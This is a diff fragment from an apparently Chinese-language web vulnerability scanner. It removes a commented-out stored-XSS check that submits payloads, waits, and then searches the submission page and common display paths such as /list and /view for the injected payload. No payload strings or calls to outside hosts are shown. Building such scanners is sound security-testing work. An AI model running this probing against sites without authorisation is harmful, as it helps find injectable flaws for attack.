-    #             if submit_status not in [200, 201, 302, 303]:
-    #                 print(f"      [-] 提交失败，状态码: {submit_status}")
-    #                 continue
-                
-    #             print(f"      [✓] 数据提交成功，状态码: {submit_status}")
-                
-    #             # 等待服务器处理
-    #             wait_time = 3
-    #             print(f"      [*] 等待 {wait_time} 秒让服务器处理数据...")
-    #             time.sleep(wait_time)
-                
-    #             # 阶段1：检查提交页面
-    #             print(f"      [*] 阶段1：检查提交页面...")
-                
-    #             try:
-    #                 check_request = {
-    #                     'method': 'GET',
-    #                     'url': url,
-    #                     'headers': headers or {},
-    #                     'cookies': cookies
-    #                 }
-                    
-    #                 check_response = self.send_controlled_request(check_request)
-                    
-    #                 if check_response:
-    #                     check_text = check_response.get('response', {}).get('text', '')
-                        
-    #                     # 检查payload和唯一标记是否在响应中
-    #                     if payload in check_text or unique_marker in check_text:
-    #                         # 检测XSS漏洞
-    #                         is_vulnerable, confidence, details = self._detect_xss_in_response(
-    #                             check_text, payload, original_value=unique_marker
-    #                         )
-                            
-    #                         if is_vulnerable and confidence in ["高", "中"]:
-    #                             vuln_info = {
-    #                                 "url": url,
-    #                                 "type": "存储型XSS",
-    #                                 "payload": payload,
-    #                                 "confidence": confidence,
-    #                                 "details": f"在提交页面发现存储的XSS: {details}",
-    #                                 "method": f"{method} -> GET",
-    #                                 "response_code": check_response.get('response', {}).get('status_code'),
-    #                                 "verification_stage": "提交页面"
-    #                             }
-    #                             vulnerabilities.append(vuln_info)
-    #                             print(f"      [!] 发现存储型XSS漏洞（提交页面）！置信度: {confidence}")
-    #             except Exception as e:
-    #                 print(f"      [-] 检查提交页面时出错: {e}")
-                
-    #             # 阶段2：尝试常见的数据展示页面
-    #             print(f"      [*] 阶段2：检查数据展示页面...")
-                
-    #             # 常见的数据展示页面路径
-    #             common_display_paths = ['/list', '/view', '/all', '/index', '/posts', '/articles', '/comments']
-    #             parsed_url = urlparse(url)
-    #             base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-                
-    #             for path in common_display_paths[:3]:  # 最多检查3个
-    #                 display_url = f"{base_url}{path}"
-                    
-    #                 try:
-    #                     display_request = {
-    #                         'method': 'GET',
-    #                         'url': display_url,
-    #                         'headers': headers or {},
-    #                         'cookies': cookies
-    #                     }
-                        
-    #                     display_response = self.send_controlled_request(display_request)
-                        
-    #                     if display_response:
-    #                         display_text = display_response.get('response', {}).get('text', '')
-                            
-    #                         # 检查payload是否在展示页面中
-    #                         if payload in display_text or unique_marker in display_text:
-    #                             # 检测XSS漏洞
-    #                             is_vulnerable, confidence, details = self._detect_xss_in_response(
-    #                                 display_text, payload, original_value=unique_marker
-    #                             )
-                                
-    #                             if is_vulnerable and confidence in ["高", "中"]:
-    #                                 vuln_info = {
-    #                                     "url": url,
-    #                                     "type": "存储型XSS",
-    #                                     "payload": payload,
-    #                                     "confidence": confidence,
-    #                                     "details": f"在展示页面 {display_url} 发现存储的XSS: {details}",
-    #                                     "method": f"{method} -> GET",
-    #                                     "response_code": display_response.get('response', {}).get('status_code'),
-    #                                     "verification_stage": "展示页面",
-    #                                     "display_url": display_url
-    #                                 }
-    #                                 vulnerabilities.append(vuln_info)
-    #                                 print(f"      [!] 发现存储型XSS漏洞（展示页面: {display_url}）！置信度: {confidence}")
-    #                                 break
-    #                 except Exception as e:
-    #                     continue
-            
-    #         except Exception as e:
-    #             print(f"    [-] 存储型XSS测试失败: {e}")
-    #             continue
-        
-    #     # 去重处理
-    #     unique_vulns = []
-    #     seen = set()
-        
-    #     for vuln in vulnerabilities:
-    #         key = f"{vuln.get('url')}_{vuln.get('payload')}_{vuln.get('verification_stage', '')}"
-    #         if key not in seen:
-    #             seen.add(key)
-    #             unique_vulns.append(vuln)
-        
-    #     print(f"    [*] 存储型XSS检测完成，发现 {len(unique_vulns)} 个漏洞")
-        
-    #     return unique_vulns
 
     def check_dom_xss(self, url_input):
         """DOM型XSS检测（需要JavaScript执行环境，这里为基础检测）"""
